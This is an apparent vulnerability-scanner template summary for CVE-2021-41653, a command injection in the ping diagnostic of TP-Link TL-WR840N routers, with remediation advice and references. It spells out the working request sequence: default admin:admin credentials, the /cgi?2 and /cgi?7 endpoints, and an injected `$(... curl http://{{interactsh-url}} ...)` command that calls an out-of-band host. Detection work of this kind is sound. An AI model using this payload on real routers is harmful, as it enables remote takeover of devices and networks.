---
cve_id: CVE-2021-41653
template_path: nuclei-templates/http/cves/2021/CVE-2021-41653.yaml
affected_product: TP-Link TL-WR840N firmware
severity: critical
authentication: required
external_callback: true
affected_versions: firmware through TL-WR840N(EU)_V5_171211
preconditions: []
poc_classification: rce
---

## Vulnerability
TP-Link TL-WR840N EU v5 router firmware through TL-WR840N(EU)_V5_171211 vulnerable to OS command injection (CWE-94) in the PING diagnostic function. Specially crafted payload injected into the IP address input field (`host` parameter of IPPING_DIAG CGI action) enables remote code execution. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (score 9.8). Impact: unauthorized access, data leakage, full device/network compromise. Remediation: upgrade to TL-WR840N(EU)_V5_211109 or later.

## PoC / Detection
Classification: rce

Template performs detection with two sequential raw POST requests (authenticated via hardcoded default `admin:admin` Basic Authorization cookie). First request to `/cgi?2` injects OS command `$(echo 127.0.0.1; curl http://{{interactsh-url}} -H 'User-Agent: {{useragent}}')` into the `host` parameter of `[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]`. Second request to `/cgi?7` triggers `[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]`. Matchers confirm via out-of-band HTTP callback on interactsh (protocol `http` and exact random User-Agent string).

## References
- https://k4m1ll0.com/cve-2021-41653.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-41653
- https://www.tp-link.com/us/press/security-advisory/
- http://tp-link.com
- https://github.com/ARPSyndicate/cvemon
